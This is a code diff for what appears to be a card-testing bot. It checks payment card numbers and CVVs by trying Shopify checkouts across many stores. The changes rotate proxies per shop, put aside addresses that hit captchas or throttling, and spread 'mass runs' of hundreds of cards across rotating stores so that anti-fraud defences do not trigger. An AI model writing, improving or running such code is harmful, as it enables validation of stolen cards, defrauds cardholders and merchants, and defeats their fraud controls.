@@ -75,6 +75,7 @@ CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
 
 
 REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
+PROXY_REQUEST_TIMEOUT = float(os.environ.get("PROXY_REQUEST_TIMEOUT", 18))
 CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
 LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
 LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")
@@ -730,6 +731,31 @@ def _stores_ready(sites: list[str]) -> list[str]:
 # The stores rate limit the VPS address, so a check has to come from
 # somewhere else.  Every proxy in the pool has its own exit address, so
 # the checkers spread over them instead of hammering one.
+# How many shops one card tries before it gives the card back.  The
+# shops take turns, so the next card starts further along.
+SITE_TRIES_PER_CARD = int(os.environ.get("SITE_TRIES_PER_CARD", 8))
+
+# How many addresses one shop is asked from.  A shop that is slow, or
+# that puts up a challenge, is saying that about one address and not
+# about the card, so the check is made again from the next address
+# before the shop is given up on.
+ADDRESSES_PER_STORE = int(os.environ.get("ADDRESSES_PER_STORE", 3))
+
+# The answers that are about the address and not about the card.
+ADDRESS_PROBLEMS = (
+    "THROTTLED", "PROXY_ERROR", "TIMEOUT", "NO_SESSION_TOKEN",
+    "CAPTCHA_REQUIRED", "CHECKPOINTDENIED", "NO_ATTEMPT_TOKEN",
+)
+
+# How often a shop gave a card answer.  The shops that answer go first.
+_store_wins: dict[str, int] = defaultdict(int)
+
+# A shop that puts up a challenge is saying it about one address and
+# not about the card.  The address is put aside for that shop, so the
+# next card leaves from somewhere else.
+_address_block: dict[tuple, float] = {}
+ADDRESS_BLOCK_SECONDS = float(os.environ.get("ADDRESS_BLOCK_SECONDS", 900))
+
 _proxy_pool: list[str] = []
 _proxy_pool_at: float = 0.0
 PROXY_POOL_TTL = float(os.environ.get("PROXY_POOL_TTL", 300))
@@ -751,6 +777,21 @@ def _load_proxy_pool() -> list[str]:
                 line = line.strip()
                 if line and not line.startswith("#"):
                     out.append(line)
+    except Exception:
+        pass
+    # The addresses the bot holds are added as well.  The bot sends them
+    # with every check, and an address that is not in the pool is never
+    # tested, so a dead one would cost a check every single time.
+    try:
+        with open(BOT_PROXY_FILE) as f:
+            data = json.load(f)
+        for entry in data.values():
+            if not isinstance(entry, dict):
+                continue
+            for raw in (entry.get("proxies") or []):
+                raw = str(raw).strip()
+                if raw and raw not in out:
+                    out.append(raw)
     except Exception:
         pass
     if not out:
@@ -838,7 +879,11 @@ def _pick_rescue_proxy(raw: Optional[str]) -> Optional[str]:
     """
     if raw:
         choices = [p.strip() for p in raw.split(",") if p.strip()]
-        good = [p for p in choices if _proxy_health.get(p, True)]
+        good = []
+        for p in choices:
+            form = _parse_proxy(p) or p
+            if _proxy_health.get(form, True):
+                good.append(form)
         if good:
             return random.choice(good)
     pool = _proxy_healthy or _load_proxy_pool()
@@ -964,14 +1009,21 @@ def _parse_proxy_any(raw: Optional[str]) -> Optional[str]:
         if not choices:
             return None
         # The proxies that are known to be dead are left out: one of
-        # them would cost the whole check.
-        good = [p for p in choices if _proxy_health.get(p, True)]
+        # them would cost the whole check.  The book of dead addresses
+        # is written with the full address, so the address is put in
+        # that form before it is looked up.
+        good = []
+        for p in choices:
+            form = _parse_proxy(p) or p
+            if _proxy_health.get(form, True):
+                good.append(form)
         if not good:
-            good = choices
+            good = [_parse_proxy(p) or p for p in choices]
         return random.choice(good)
-    if _proxy_health.get(raw) is False:
+    form = _parse_proxy(raw) or raw
+    if _proxy_health.get(form) is False:
         return None
-    return raw
+    return form
 
 
 def _pick_address(url: str, currency: Optional[str] = None) -> dict:
@@ -1108,7 +1160,10 @@ def _parse_gql_errors(errors: list) -> str:
 def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
     proxy = _parse_proxy_any(proxy_str) if proxy_str else None
     proxies = {"http": proxy, "https": proxy} if proxy else None
-    session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT, proxies=proxies))
+    # A request that leaves through an address is given less time.  An
+    # address that does not answer should not hold the card.
+    timeout = PROXY_REQUEST_TIMEOUT if proxy else REQUEST_TIMEOUT
+    session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=timeout, proxies=proxies))
     return session, True
 
 
@@ -2402,6 +2457,10 @@ def _site_has_product_in_band(site: str, min_price: float, max_price: float) -> 
     entry = _product_cache.get(f"{hostname}|{max_price:.2f}")
     if not entry:
         return True
+    # The list could not be fetched.  That says nothing about the price
+    # of the store, so the store gets its chance.
+    if not entry.get("ok"):
+        return True
     candidates = entry.get("candidates") or []
     if not candidates:
         return False
@@ -2432,30 +2491,67 @@ async def validate_card_across_sites(
     cap is skipped -- the next one gets a turn.
     """
     last: Optional[dict] = None
+    tried = 0
+    skipped = 0
     for site in sites[:max_sites]:
         # A store that has nothing to sell inside the band is skipped
         # without a checkout attempt.  The product list is cached per
-        # store and band, so this is known after the first card.
+        # store and band, so this is known after the first card.  A
+        # store that is skipped is not an attempt: it does not use up
+        # the card's time.
         if min_price and not _site_has_product_in_band(
             site, float(min_price), float(max_price if max_price is not None else MAX_PRICE)
         ):
+            skipped += 1
             continue
-        # The normal route first: it is the fastest one and it is the
-        # one that works until a store rate limits us.  Only then is the
-        # check repeated through a proxy, which leaves from another
-        # address.
-        result = await validate_card_with_retry(
-            cc, month, year, cvv, site,
-            proxy_str=None, max_price=max_price, min_price=min_price,
-        )
-        if str(result.get("Response", "")) in ("THROTTLED", "PROXY_ERROR"):
+        # A card does not walk through every shop in the list: a shop
+        # that is slow takes the card's time with it.  The next card
+        # starts further along the list, so the shops all get their turn.
+        if tried >= SITE_TRIES_PER_CARD:
+            break
+        tried += 1
+        # The addresses to ask this shop from.  The caller gives a list
+        # of them, so every card leaves from a different address.  A
+        # shop that is slow or that puts up a challenge is asked again
+        # from the next address before it is given up on: that costs one
+        # short attempt instead of the whole card.
+        addresses = [p.strip() for p in (proxy_str or "").split(",") if p.strip()]
+        if not addresses:
+            addresses = [None]
+
+        # The addresses this shop refused are left out, so the card goes
+        # to an address the shop has not turned away yet.
+        host = _host_of(site)
+        free = [a for a in addresses
+                if time.time() >= _address_block.get((host, a), 0.0)]
+        if not free:
+            free = addresses[:1]
+        free = free[:ADDRESSES_PER_STORE]
+
+        result: dict = {}
+        resp = ""
+        for address in free:
+            result = await validate_card_with_retry(
+                cc, month, year, cvv, site,
+                proxy_str=address, max_price=max_price, min_price=min_price,
+            )
+            resp = str(result.get("Response", ""))
+            if resp in ADDRESS_PROBLEMS:
+                # This shop turned this address away.  The pair is put
+                # aside so the next card leaves from somewhere else.
+                _address_block[(host, address)] = time.time() + ADDRESS_BLOCK_SECONDS
+                continue
+            break
+        # Nothing worked from the addresses the caller gave.  One more
+        # address from the pool is tried before the shop is left alone.
+        if resp in ADDRESS_PROBLEMS:
             alt = _pick_rescue_proxy(proxy_str)
-            if alt:
+            if alt and alt not in addresses[:ADDRESSES_PER_STORE]:
                 result = await validate_card_with_retry(
                     cc, month, year, cvv, site,
                     proxy_str=alt, max_price=max_price, min_price=min_price,
                 )
-        resp = str(result.get("Response", ""))
+                resp = str(result.get("Response", ""))
         # A card verdict (or a bank decline) is a real answer -- stop here.
         if resp not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
                         "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
@@ -2469,6 +2565,7 @@ async def validate_card_across_sites(
                         # it, the last answer is the card's after all.
                         "TOKENIZATION_FAILED"):
             _store_pardon(site)
+            _store_wins[_host_of(site)] += 1
             return result
         # The store could not do the checkout.  It is put aside for a
         # while so the next cards go to the stores that still answer.
@@ -2484,7 +2581,7 @@ async def validate_card_across_sites(
         return last
     return {
         "Response": "NO_PRODUCT",
-        "Message": "No usable site",
+        "Message": f"No usable site ({tried} shops asked, {skipped} without an item in the band)",
         "code": "NO_PRODUCT",
         "decline_code": "NO_PRODUCT",
         "Gateway": "Shopify Payments",
@@ -2550,6 +2647,7 @@ async def shopify_route(
             )
         card = random.choice(cards)
 
+    global _site_turn
     # The stores are asked in turn.  A mass run sends hundreds of cards
     # at the same time, and a shop that gets every one of them puts up a
     # captcha and the whole run crawls.  Taking the shops in turns gives
@@ -2564,13 +2662,20 @@ async def shopify_route(
         )
     # The stores that are cooling down are asked last.
     rest = [s for s in _stores_ready(sites) if s not in named]
-    pool = named + rest
-    if pool:
-        global _site_turn
-        offset = _site_turn % len(pool)
-        pool = pool[offset:] + pool[:offset]
-        _site_turn += 1
-    sites = pool
+    # The shops that gave a card answer go first, and they take turns
+    # among themselves, so one shop does not get every card.  The shops
+    # that have not answered yet are asked when those are cooling down.
+    winners = [s for s in rest if _store_wins.get(_host_of(s), 0) > 0]
+    others = [s for s in rest if s not in winners]
+    if winners:
+        offset = _site_turn % len(winners)
+        winners = winners[offset:] + winners[:offset]
+    _site_turn += 1
+    # The stores that are cooling down are asked last.  A store that is
+    # slow is better than no store at all, and a card with nowhere to
+    # go is a card that never reaches the bank.
+    cooling = [s for s in sites if s not in named and s not in winners and s not in others]
+    sites = named + winners + others + cooling
 
     result = await validate_card_across_sites(
         card["cc"], card["month"], card["year"], card["cvv"],
